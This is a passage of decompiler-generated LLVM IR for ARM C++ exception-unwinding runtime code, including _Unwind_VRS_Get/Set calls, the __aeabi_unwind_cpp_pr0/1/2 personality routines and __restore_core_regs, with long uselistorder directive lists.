  br i1 %v1_17ea4, label %dec_label_pc_17eac, label %dec_label_pc_17f6c

dec_label_pc_17eac:                               ; preds = %dec_label_pc_17ea0, %dec_label_pc_17f64
  %v0_17eac = phi i32 [ %storemerge, %dec_label_pc_17f64 ], [ %v0_17eac.pre, %dec_label_pc_17ea0 ]
  store i32 %v0_17eac, i32* %r0.global-to-local, align 4
  %v1_17eb0 = add i32 %v0_17eac, 4
  store i32 %v1_17eb0, i32* @r6, align 4
  br label %dec_label_pc_17f6c

dec_label_pc_17eb8:                               ; preds = %bb154
  store i32 %v1_17c38, i32* %r2.global-to-local, align 4
  br i1 %v2_17d34, label %dec_label_pc_17ec4, label %dec_label_pc_17fb0

dec_label_pc_17ec4:                               ; preds = %dec_label_pc_17eb8
  %v2_17ec4 = icmp eq i32 %v0_17ec4, 0
  br i1 %v2_17ec4, label %dec_label_pc_17f30, label %dec_label_pc_17ecc

dec_label_pc_17ecc:                               ; preds = %dec_label_pc_17ec4
  %v0_17ecc = load i32, i32* @r7, align 4
  %v1_17ecc = add i32 %v0_17ecc, 4
  %v2_17ecc = inttoptr i32 %v1_17ecc to i32*
  %v3_17ecc = load i32, i32* %v2_17ecc, align 4
  %v7_17ed0 = icmp eq i32 %v3_17ecc, -2
  store i32 %v1_17ecc, i32* %r2.global-to-local, align 4
  br i1 %v7_17ed0, label %dec_label_pc_17de8, label %dec_label_pc_17edc

dec_label_pc_17edc:                               ; preds = %dec_label_pc_17ecc
  %v0_17edc = load i32, i32* @r8, align 4
  %v1_17edc = add i32 %v0_17edc, 88
  %v7_17ee0 = icmp eq i32 %v3_17ecc, -1
  store i32 %v1_17edc, i32* %forced_unwind_-44, align 4
  br i1 %v7_17ee0, label %dec_label_pc_17f24, label %dec_label_pc_17eec

dec_label_pc_17eec:                               ; preds = %dec_label_pc_17edc
  %v2_17ef0 = icmp eq i32 %v3_17ecc, 0
  br i1 %v2_17ef0, label %bb163, label %bb162

bb162:                                            ; preds = %dec_label_pc_17eec
  br label %bb163

bb163:                                            ; preds = %dec_label_pc_17eec, %bb162
  store i32 %v0_17edc, i32* %r0.global-to-local, align 4
  store i32 %v2_17f00, i32* %r2.global-to-local, align 4
  %v4_17f0c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 108) to i32*), align 4
  store i32 98072, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_17f0c)
  %v0_17f18 = load i32, i32* %r0.global-to-local, align 4
  %v2_17f18 = icmp eq i32 %v0_17f18, 0
  br i1 %v2_17f18, label %bb164, label %.thread25

.thread25:                                        ; preds = %bb163
  %v3_17f24.pr = load i32, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_17f24

bb164:                                            ; preds = %bb163
  store i32 0, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_17f30

dec_label_pc_17f24:                               ; preds = %.thread25, %dec_label_pc_17edc
  %v3_17f24 = phi i32 [ %v3_17f24.pr, %.thread25 ], [ %v1_17edc, %dec_label_pc_17edc ]
  %v2_17f28 = icmp eq i32 %v3_17f24, 0
  br i1 %v2_17f28, label %dec_label_pc_17f30, label %dec_label_pc_18088

dec_label_pc_17f30:                               ; preds = %bb164, %dec_label_pc_17fdc, %dec_label_pc_17fb0, %dec_label_pc_17f24, %dec_label_pc_17ec4
  %v0_17f30 = load i32, i32* @r7, align 4
  %v1_17f30 = add i32 %v0_17f30, 8
  %v1_17c98 = inttoptr i32 %v1_17f30 to i32*
  %v2_17c98 = load i32, i32* %v1_17c98, align 4
  %v2_17c9c = icmp eq i32 %v2_17c98, 0
  br i1 %v2_17c9c, label %dec_label_pc_17d58, label %dec_label_pc_17ca4.preheader

dec_label_pc_17f38:                               ; preds = %entry
  %v3_17f38 = udiv i32 %v2_17c2c, 65536
  store i32 2, i32* %r2.global-to-local, align 4
  %v6_17f48 = mul nuw nsw i32 %v3_17f38, 4
  %v3_17f4c = mul i32 %v2_17c2c, 65536
  %v2_17f50 = add i32 %v6_17f48, %v4_17c2c
  store i32 %v3_17f4c, i32* %v4_17c4c, align 8
  br label %dec_label_pc_17c74

dec_label_pc_17f60:                               ; preds = %bb159, %dec_label_pc_17e0c
  %v1_17f60 = add i32 %v0_17dfc, 4
  br label %dec_label_pc_17f64

dec_label_pc_17f64:                               ; preds = %dec_label_pc_17fa4, %dec_label_pc_17f60
  %v0_17f64 = phi i32 [ %v2_17fa4, %dec_label_pc_17fa4 ], [ %v2_17dfc, %dec_label_pc_17f60 ]
  %storemerge = phi i32 [ %v4_17fa4, %dec_label_pc_17fa4 ], [ %v1_17f60, %dec_label_pc_17f60 ]
  store i32 %storemerge, i32* @r6, align 4
  %v1_17f64 = icmp slt i32 %v0_17f64, 0
  br i1 %v1_17f64, label %dec_label_pc_17eac, label %dec_label_pc_17f6c

dec_label_pc_17f6c:                               ; preds = %dec_label_pc_17ea0, %dec_label_pc_17f64, %dec_label_pc_18078, %dec_label_pc_17eac
  %v0_17f70 = phi i32 [ %v1_17eb0, %dec_label_pc_17eac ], [ %storemerge, %dec_label_pc_17f64 ], [ %v1_1807c, %dec_label_pc_18078 ], [ %v0_17eac.pre, %dec_label_pc_17ea0 ]
  %stack_var_-76.4 = phi i32 [ %stack_var_-76.2.ph3175, %dec_label_pc_17eac ], [ %stack_var_-76.2.ph3175, %dec_label_pc_17f64 ], [ %v1_18078, %dec_label_pc_18078 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_17ea0 ]
  %v0_17f6c = load i32, i32* @sl, align 4
  %v3_17f6c = mul i32 %v0_17f6c, 4
  %v2_17f70 = add i32 %v3_17f6c, %v0_17f70
  %v1_17c9865 = inttoptr i32 %v2_17f70 to i32*
  %v2_17c9866 = load i32, i32* %v1_17c9865, align 4
  %v2_17c9c68 = icmp eq i32 %v2_17c9866, 0
  br i1 %v2_17c9c68, label %dec_label_pc_17d58, label %dec_label_pc_17ca4.preheader.lr.ph

dec_label_pc_17f78:                               ; preds = %dec_label_pc_17df8
  %v0_17f88 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_17f88, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_17f90 = load i32, i32* @r8, align 4
  %v1_17f90 = add i32 %v0_17f90, 32
  %v2_17f90 = inttoptr i32 %v1_17f90 to i32*
  %v3_17f90 = load i32, i32* %v2_17f90, align 4
  store i32 %v3_17f90, i32* @r4, align 4
  %v5_17f94 = call i32 @_Unwind_VRS_Get(i32 %v0_17f88, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_17f94, i32* %r0.global-to-local, align 4
  %v3_17f98 = load i32, i32* %stack_var_-48, align 4
  %v0_17f9c = load i32, i32* @r4, align 4
  %v9_17f9c = icmp eq i32 %v0_17f9c, %v3_17f98
  br i1 %v9_17f9c, label %dec_label_pc_18044, label %dec_label_pc_17f78.dec_label_pc_17fa4_crit_edge

dec_label_pc_17f78.dec_label_pc_17fa4_crit_edge:  ; preds = %dec_label_pc_17f78
  %v0_17fa4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_17fa4

dec_label_pc_17fa4:                               ; preds = %dec_label_pc_17f78.dec_label_pc_17fa4_crit_edge, %dec_label_pc_18044
  %v0_17fa4 = phi i32 [ %v0_17fa4.pre, %dec_label_pc_17f78.dec_label_pc_17fa4_crit_edge ], [ %v1_18048, %dec_label_pc_18044 ]
  %v1_17fa4 = inttoptr i32 %v0_17fa4 to i32*
  %v2_17fa4 = load i32, i32* %v1_17fa4, align 4
  %v4_17fa4 = add i32 %v0_17fa4, 4
  store i32 %v4_17fa4, i32* @r7, align 4
  br label %dec_label_pc_17f64

dec_label_pc_17fb0:                               ; preds = %dec_label_pc_17eb8
  %v0_17fc0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_17fc0, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_17fc8 = load i32, i32* @r8, align 4
  %v1_17fc8 = add i32 %v0_17fc8, 32
  %v2_17fc8 = inttoptr i32 %v1_17fc8 to i32*
  %v3_17fc8 = load i32, i32* %v2_17fc8, align 4
  store i32 %v3_17fc8, i32* @r4, align 4
  %v5_17fcc = call i32 @_Unwind_VRS_Get(i32 %v0_17fc0, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_17fcc, i32* %r0.global-to-local, align 4
  %v3_17fd0 = load i32, i32* %stack_var_-48, align 4
  %v0_17fd4 = load i32, i32* @r4, align 4
  %v9_17fd4 = icmp eq i32 %v0_17fd4, %v3_17fd0
  br i1 %v9_17fd4, label %dec_label_pc_17fdc, label %dec_label_pc_17f30

dec_label_pc_17fdc:                               ; preds = %dec_label_pc_17fb0
  %v0_17fdc = load i32, i32* @r8, align 4
  %v1_17fdc = add i32 %v0_17fdc, 40
  %v2_17fdc = inttoptr i32 %v1_17fdc to i32*
  %v3_17fdc = load i32, i32* %v2_17fdc, align 4
  %v1_17fe0 = load i32, i32* @r7, align 4
  %v9_17fe0 = icmp eq i32 %v3_17fdc, %v1_17fe0
  br i1 %v9_17fe0, label %dec_label_pc_17fe8, label %dec_label_pc_17f30

dec_label_pc_17fe8:                               ; preds = %dec_label_pc_17fdc
  %v1_17fe8 = inttoptr i32 %v3_17fdc to i32*
  %v2_17fe8 = load i32, i32* %v1_17fe8, align 4
  %v1_17fec = and i32 %v2_17fe8, 1073741824
  %v2_17fec = icmp eq i32 %v1_17fec, 0
  br i1 %v2_17fec, label %.thread26, label %bb165

bb165:                                            ; preds = %dec_label_pc_17fe8
  %v2_17ff0 = or i32 %v2_17fe8, -2147483648
  br label %bb166

.thread26:                                        ; preds = %dec_label_pc_17fe8
  %tmp208 = bitcast i32 %v2_17fe8 to float
  %tmp209 = call float @fabsf(float %tmp208)
  %v2_17ff4 = bitcast float %tmp209 to i32
  br label %bb166

bb166:                                            ; preds = %bb165, %bb169, %.thread28, %.thread26
  %v1_17ff8 = phi i32 [ %v2_18128, %.thread28 ], [ %v2_18128, %bb169 ], [ %v3_17fdc, %bb165 ], [ %v3_17fdc, %.thread26 ]
  %v0_17ff8 = phi i32 [ %v2_18138, %.thread28 ], [ %v2_18134, %bb169 ], [ %v2_17ff0, %bb165 ], [ %v2_17ff4, %.thread26 ]
  %v2_17ff8 = add i32 %v0_17ff8, %v1_17ff8
  store i32 %v2_17ff8, i32* %stack_var_-48, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_18010 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18010, i32* %r0.global-to-local, align 4
  %v5_18018 = call i32 @_Unwind_VRS_Set(i32 %v0_18010, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v0_18010, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_18030 = load i32, i32* @r8, align 4
  store i32 %v0_18030, i32* %stack_var_-48, align 4
  %v5_18038 = call i32 @_Unwind_VRS_Set(i32 %v0_18010, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17dec

dec_label_pc_18044:                               ; preds = %dec_label_pc_17f78
  %v0_18044 = load i32, i32* @r8, align 4
  %v1_18044 = add i32 %v0_18044, 40
  %v2_18044 = inttoptr i32 %v1_18044 to i32*
  %v3_18044 = load i32, i32* %v2_18044, align 4
  %v1_18048 = load i32, i32* @r7, align 4
  %v9_18048 = icmp eq i32 %v3_18044, %v1_18048
  br i1 %v9_18048, label %dec_label_pc_18050, label %dec_label_pc_17fa4

dec_label_pc_18050:                               ; preds = %dec_label_pc_18044
  %v1_18054 = add i32 %v3_18044, 4
  store i32 %v1_18054, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v2_1805c = add i32 %v0_18044, 44
  %v3_1805c = inttoptr i32 %v2_1805c to i32*
  store i32 0, i32* %v3_1805c, align 4
  %v0_18060 = load i32, i32* %r2.global-to-local, align 4
  %v1_18060 = load i32, i32* @r8, align 4
  %v2_18060 = add i32 %v1_18060, 48
  %v3_18060 = inttoptr i32 %v2_18060 to i32*
  store i32 %v0_18060, i32* %v3_18060, align 4
  %v0_18064 = load i32, i32* @sl, align 4
  %v1_18064 = load i32, i32* @r8, align 4
  %v2_18064 = add i32 %v1_18064, 40
  %v3_18064 = inttoptr i32 %v2_18064 to i32*
  store i32 %v0_18064, i32* %v3_18064, align 4
  %v0_18068 = load i32, i32* %r0.global-to-local, align 4
  %v1_18068 = load i32, i32* @r8, align 4
  %v2_18068 = add i32 %v1_18068, 52
  %v3_18068 = inttoptr i32 %v2_18068 to i32*
  store i32 %v0_18068, i32* %v3_18068, align 4
  %v0_1806c = load i32, i32* @r7, align 4
  %v1_1806c = inttoptr i32 %v0_1806c to i32*
  %v2_1806c = load i32, i32* %v1_1806c, align 4
  %v1_18070 = icmp slt i32 %v2_1806c, 0
  br i1 %v1_18070, label %dec_label_pc_18078, label %dec_label_pc_18124

dec_label_pc_18078:                               ; preds = %dec_label_pc_18050
  %v0_18078 = load i32, i32* %r2.global-to-local, align 4
  %v1_18078 = add i32 %v0_18078, -3
  store i32 %v1_18078, i32* %r2.global-to-local, align 4
  %v0_1807c = load i32, i32* %r0.global-to-local, align 4
  %v1_1807c = add i32 %v0_1807c, 4
  store i32 %v1_1807c, i32* @r6, align 4
  br label %dec_label_pc_17f6c

dec_label_pc_18088:                               ; preds = %dec_label_pc_17e98, %dec_label_pc_17f24, %dec_label_pc_17e50, %dec_label_pc_17e24.thread
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_18098 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18098, i32* %r0.global-to-local, align 4
  %v5_180a0 = call i32 @_Unwind_VRS_Get(i32 %v0_18098, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_180a4 = load i32, i32* @r7, align 4
  %v1_180a4 = load i32, i32* @r8, align 4
  %v2_180a4 = add i32 %v1_180a4, 40
  %v3_180a4 = inttoptr i32 %v2_180a4 to i32*
  store i32 %v0_180a4, i32* %v3_180a4, align 4
  %v3_180a8 = load i32, i32* %stack_var_-48, align 4
  %v3_180ac = load i32, i32* %forced_unwind_-44, align 4
  store i32 %v3_180ac, i32* %r2.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_180b4 = load i32, i32* @r8, align 4
  %v2_180b4 = add i32 %v1_180b4, 32
  %v3_180b4 = inttoptr i32 %v2_180b4 to i32*
  store i32 %v3_180a8, i32* %v3_180b4, align 4
  %v0_180b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_180b8 = load i32, i32* @r8, align 4
  %v2_180b8 = add i32 %v1_180b8, 36
  %v3_180b8 = inttoptr i32 %v2_180b8 to i32*
  store i32 %v0_180b8, i32* %v3_180b8, align 4
  %v1_17df4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17dec

dec_label_pc_180c0:                               ; preds = %bb155
  %v1_180c0 = inttoptr i32 %v0_17d48 to i32*
  %v2_180c0 = load i32, i32* %v1_180c0, align 4
  %v1_180c4 = add i32 %v0_17d48, 4
  %v1_180c8 = and i32 %v2_180c0, 1073741824
  %v2_180c8 = icmp eq i32 %v1_180c8, 0
  %v2_180cc = or i32 %v2_180c0, -2147483648
  %tmp210 = bitcast i32 %v2_180c0 to float
  %tmp211 = call float @fabsf(float %tmp210)
  %v2_180d0 = bitcast float %tmp211 to i32
  %storemerge122 = select i1 %v2_180c8, i32 %v2_180d0, i32 %v2_180cc
  store i32 %storemerge122, i32* %r4.global-to-local, align 4
  %v1_180d4 = load i32, i32* @r8, align 4
  %v2_180d4 = add i32 %v1_180d4, 56
  %v3_180d4 = inttoptr i32 %v2_180d4 to i32*
  store i32 %v1_180c4, i32* %v3_180d4, align 4
  %v0_180d8 = load i32, i32* @r8, align 4
  store i32 %v0_180d8, i32* %r0.global-to-local, align 4
  %v4_180e4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 32) to i32*), align 4
  store i32 98544, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_180e4)
  %v0_180f0 = load i32, i32* %r0.global-to-local, align 4
  %v2_180f0 = icmp eq i32 %v0_180f0, 0
  br i1 %v2_180f0, label %dec_label_pc_17de8, label %dec_label_pc_180f8

dec_label_pc_180f8:                               ; preds = %dec_label_pc_180c0
  %v0_180f8 = load i32, i32* %r4.global-to-local, align 4
  %v1_180f8 = load i32, i32* @r7, align 4
  %v2_180f8 = add i32 %v1_180f8, %v0_180f8
  store i32 %v2_180f8, i32* %stack_var_-48, align 4
  %v0_18108 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18108, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v5_18118 = call i32 @_Unwind_VRS_Set(i32 %v0_18108, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17dec

dec_label_pc_18124:                               ; preds = %dec_label_pc_18050
  %v0_18124 = load i32, i32* @sl, align 4
  %v3_18124 = mul i32 %v0_18124, 4
  %v0_18128 = load i32, i32* %r0.global-to-local, align 4
  %v2_18128 = add i32 %v0_18128, %v3_18124
  %v3_18128 = inttoptr i32 %v2_18128 to i32*
  %v4_18128 = load i32, i32* %v3_18128, align 4
  %v1_1812c = and i32 %v4_18128, 1073741824
  %v2_1812c = icmp eq i32 %v1_1812c, 0
  br i1 %v2_1812c, label %.thread28, label %bb169

bb169:                                            ; preds = %dec_label_pc_18124
  %v2_18134 = or i32 %v4_18128, -2147483648
  br label %bb166

.thread28:                                        ; preds = %dec_label_pc_18124
  %tmp212 = bitcast i32 %v4_18128 to float
  %tmp213 = call float @fabsf(float %tmp212)
  %v2_18138 = bitcast float %tmp213 to i32
  br label %bb166

; uselistorder directives
  uselistorder i32 %v2_18128, { 2, 1, 0 }
  uselistorder i32 %v1_1807c, { 1, 0 }
  uselistorder i32 %v1_18078, { 1, 0 }
  uselistorder i32 %v1_18048, { 1, 0 }
  uselistorder i32 %v0_18010, { 1, 0, 2, 3 }
  uselistorder i32 %v3_17fdc, { 1, 2, 0, 3 }
  uselistorder i32 %v4_17fa4, { 1, 0 }
  uselistorder i32 %v0_17fa4, { 1, 0 }
  uselistorder i32 %v2_17c9866, { 1, 0 }
  uselistorder i32 %v2_17f70, { 1, 0 }
  uselistorder i32 %stack_var_-76.4, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v2_17c98, { 1, 0 }
  uselistorder i32 %v1_17f30, { 1, 0 }
  uselistorder i32 %v3_17ecc, { 2, 0, 1 }
  uselistorder i32 %v0_17eac, { 1, 0 }
  uselistorder i32 %v0_17eac.pre, { 1, 0 }
  uselistorder i32 %v1_17e04, { 1, 0 }
  uselistorder i32 %v2_17dfc, { 1, 0 }
  uselistorder i32 %v0_17d8c, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-76.3, { 1, 0 }
  uselistorder i32 %v2_17d4c, { 1, 0 }
  uselistorder i32 %v1_17d48, { 1, 0 }
  uselistorder i32 %v0_17d48, { 1, 0, 2 }
  uselistorder i32 %v4_17d20, { 0, 2, 1, 3 }
  uselistorder i32 %v0_17ec4, { 1, 2, 0 }
  uselistorder i32 %v0_17cf8, { 1, 0 }
  uselistorder i32 %v3_17cf4, { 1, 0, 2 }
  uselistorder i32 %v1_17cc8, { 0, 2, 4, 1, 3 }
  uselistorder i32 %stack_var_-76.2.ph3175, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v2_17f00, { 1, 0 }
  uselistorder i1 %v2_17d34, { 1, 0, 2 }
  uselistorder i32 %v1_17c38, { 4, 3, 1, 2, 6, 5, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 5, 6, 7, 0, 9, 8 }
  uselistorder %anon_struct_4* %uws_-60, { 1, 0 }
  uselistorder i32* %forced_unwind_-44, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0 }
  uselistorder i32* %r0.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 13, 12, 14, 16, 15, 24, 17, 18, 19, 20, 21, 22, 23, 26, 25, 28, 27, 29, 30, 32, 31, 35, 33, 34, 0 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32 6, { 19, 0, 5, 9, 10, 14, 15, 3, 1, 6, 11, 2, 4, 12, 13, 16, 17, 7, 8, 18 }
  uselistorder i32 -3, { 2, 0, 3, 1, 4, 6, 5 }
  uselistorder i32 52, { 22, 2, 3, 1, 8, 13, 9, 5, 15, 11, 10, 16, 14, 12, 17, 18, 4, 19, 0, 20, 21, 6, 7 }
  uselistorder i32 48, { 48, 30, 9, 31, 32, 4, 10, 33, 11, 34, 12, 35, 13, 44, 6, 14, 1, 36, 15, 40, 41, 37, 38, 16, 17, 2, 43, 39, 42, 18, 19, 20, 5, 0, 21, 22, 23, 3, 24, 25, 26, 7, 27, 45, 46, 47, 28, 29, 8 }
  uselistorder i32 44, { 33, 6, 7, 8, 9, 10, 1, 34, 35, 11, 12, 0, 13, 2, 3, 4, 17, 18, 19, 20, 21, 22, 14, 15, 16, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 5 }
  uselistorder i32 -2147483648, { 22, 23, 24, 25, 26, 27, 28, 29, 0, 6, 1, 7, 8, 9, 10, 11, 12, 13, 14, 15, 4, 5, 16, 17, 3, 18, 19, 20, 21, 2 }
  uselistorder i32 1073741824, { 8, 9, 10, 11, 12, 13, 14, 15, 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder i32 65536, { 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11, 0, 12, 13, 15, 14, 20, 16, 21, 17, 22, 18, 23, 19, 24, 25, 26, 30, 27, 31, 28, 32, 29, 33, 42, 43, 34, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 108) to i32*), { 1, 0 }
  uselistorder i32 88, { 11, 12, 9, 0, 10, 7, 8, 1, 3, 2, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_22290.79 to i32), { 45, 8, 46, 47, 9, 10, 89, 119, 11, 16, 18, 13, 14, 17, 12, 15, 120, 121, 90, 19, 122, 20, 123, 92, 91, 53, 50, 51, 52, 49, 21, 56, 48, 93, 94, 124, 22, 23, 95, 125, 2, 126, 127, 128, 129, 130, 131, 132, 3, 4, 0, 5, 96, 97, 133, 24, 98, 134, 25, 26, 27, 28, 29, 58, 57, 59, 135, 136, 44, 99, 137, 100, 138, 30, 31, 101, 102, 103, 139, 32, 140, 141, 142, 60, 33, 143, 144, 145, 34, 104, 146, 147, 35, 36, 37, 148, 105, 149, 38, 150, 39, 151, 152, 106, 153, 40, 154, 6, 107, 155, 108, 156, 109, 157, 41, 158, 159, 42, 43, 111, 160, 161, 162, 163, 164, 165, 54, 84, 80, 78, 77, 79, 81, 82, 83, 76, 85, 71, 73, 72, 70, 69, 74, 75, 66, 65, 68, 67, 64, 63, 62, 61, 113, 86, 112, 87, 55, 88, 110, 114, 166, 7, 115, 116, 167, 117, 1, 118 }
  uselistorder i32 -2, { 0, 26, 27, 9, 10, 2, 3, 8, 12, 11, 20, 13, 14, 21, 5, 6, 4, 15, 16, 17, 1, 7, 18, 22, 23, 24, 25, 19 }
  uselistorder i32 80, { 10, 11, 12, 4, 5, 6, 9, 7, 8, 1, 2, 0, 3 }
  uselistorder i32 %ucbp, { 0, 1, 3, 2 }
  uselistorder i32 %state, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18088, { 1, 0, 2, 3 }
  uselistorder label %bb166, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_17fa4, { 1, 0 }
  uselistorder label %dec_label_pc_17f6c, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_17f30, { 1, 2, 3, 0, 4 }
  uselistorder label %bb163, { 1, 0 }
  uselistorder label %dec_label_pc_17eac, { 1, 0 }
  uselistorder label %bb161, { 1, 0 }
  uselistorder label %dec_label_pc_17dec, { 1, 2, 3, 5, 4, 0 }
  uselistorder label %dec_label_pc_17de8, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_17d48, { 1, 0 }
  uselistorder label %bb154, { 2, 0, 1 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %dec_label_pc_17ca4, { 1, 0 }
  uselistorder label %dec_label_pc_17ca4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_17ca4.preheader.lr.ph, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
}

define i32 @function_18144(i32 %arg1) local_unnamed_addr {
dec_label_pc_18144:
  %v0_18144 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18144, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_18144
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_18144, %bb
  %v4_1814c = phi i32 [ %arg1, %dec_label_pc_18144 ], [ 0, %bb ]
  ret i32 %v4_1814c

; uselistorder directives
  uselistorder i1 false, { 0, 1, 2, 43, 16, 17, 14, 18, 57, 58, 59, 60, 61, 62, 11, 12, 15, 63, 64, 65, 66, 13, 44, 39, 45, 46, 47, 48, 49, 6, 36, 5, 8, 67, 19, 9, 10, 20, 21, 40, 4, 34, 3, 24, 25, 26, 50, 22, 23, 51, 52, 53, 54, 55, 56, 41, 42, 27, 28, 31, 30, 29, 32, 33, 7, 38, 35, 37, 68, 69, 70, 71 }
  uselistorder i1* @cpsr_z, { 1, 2, 35, 34, 36, 37, 38, 39, 40, 41, 42, 43, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 48, 19, 20, 21, 22, 23, 24, 25, 26, 44, 45, 46, 47, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__aeabi_unwind_cpp_pr2(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_18154 = load i32, i32* @r1, align 4
  %v2_18154 = load i32, i32* @r2, align 4
  %v4_18154 = call i32 @__gnu_unwind_pr_common(i32 2, i32 %v1_18154, i32 %v2_18154, i32 2)
  ret i32 %v4_18154
}

define i32 @__aeabi_unwind_cpp_pr1(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_1815c = load i32, i32* @r1, align 4
  %v2_1815c = load i32, i32* @r2, align 4
  %v4_1815c = call i32 @__gnu_unwind_pr_common(i32 1, i32 %v1_1815c, i32 %v2_1815c, i32 1)
  ret i32 %v4_1815c
}

define i32 @__aeabi_unwind_cpp_pr0(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_18164 = load i32, i32* @r1, align 4
  %v2_18164 = load i32, i32* @r2, align 4
  %v4_18164 = call i32 @__gnu_unwind_pr_common(i32 0, i32 %v1_18164, i32 %v2_18164, i32 0)
  ret i32 %v4_18164

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @__gnu_unwind_pr_common, { 2, 1, 0 }
  uselistorder i32* @r2, { 16, 15, 17, 131, 23, 24, 25, 26, 27, 3, 28, 29, 30, 31, 32, 33, 14, 34, 35, 36, 73, 74, 13, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 77, 18, 51, 52, 53, 54, 55, 56, 57, 59, 58, 60, 61, 62, 63, 64, 65, 66, 78, 79, 80, 81, 82, 101, 102, 103, 104, 105, 106, 19, 2, 87, 20, 67, 68, 69, 70, 132, 133, 134, 135, 85, 86, 4, 75, 76, 107, 108, 109, 88, 71, 138, 139, 140, 89, 5, 90, 91, 6, 92, 93, 94, 95, 96, 97, 98, 99, 100, 21, 112, 113, 114, 141, 136, 137, 150, 151, 152, 153, 142, 7, 143, 83, 84, 8, 117, 118, 119, 9, 120, 121, 122, 10, 115, 116, 123, 11, 124, 110, 72, 154, 161, 162, 155, 156, 157, 158, 159, 160, 0, 1, 163, 12, 22, 144, 145, 146, 147, 148, 149, 111, 125, 126, 127, 128, 129, 130 }
}

define i32 @__restore_core_regs(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_1816c = add i32 %tmp, 56
  %v4_1816c = inttoptr i32 %v3_1816c to i32*
  %v5_1816c = load i32, i32* %v4_1816c, align 4
  %v6_1816c = add i32 %tmp, 60
  %v7_1816c = inttoptr i32 %v6_1816c to i32*
  %v8_1816c = load i32, i32* %v7_1816c, align 4
  %v2_18178 = load i32, i32* %arg1, align 4
  %v3_18178 = add i32 %tmp, 4
  %v4_18178 = inttoptr i32 %v3_18178 to i32*
  %v5_18178 = load i32, i32* %v4_18178, align 4
  store i32 %v5_18178, i32* @r1, align 4
  %v12_18178 = add i32 %tmp, 16
  %v13_18178 = inttoptr i32 %v12_18178 to i32*
  %v14_18178 = load i32, i32* %v13_18178, align 4
  store i32 %v14_18178, i32* @r4, align 4
  %v15_18178 = add i32 %tmp, 20
  %v16_18178 = inttoptr i32 %v15_18178 to i32*
  %v17_18178 = load i32, i32* %v16_18178, align 4
  store i32 %v17_18178, i32* @r5, align 4
  %v18_18178 = add i32 %tmp, 24
  %v19_18178 = inttoptr i32 %v18_18178 to i32*
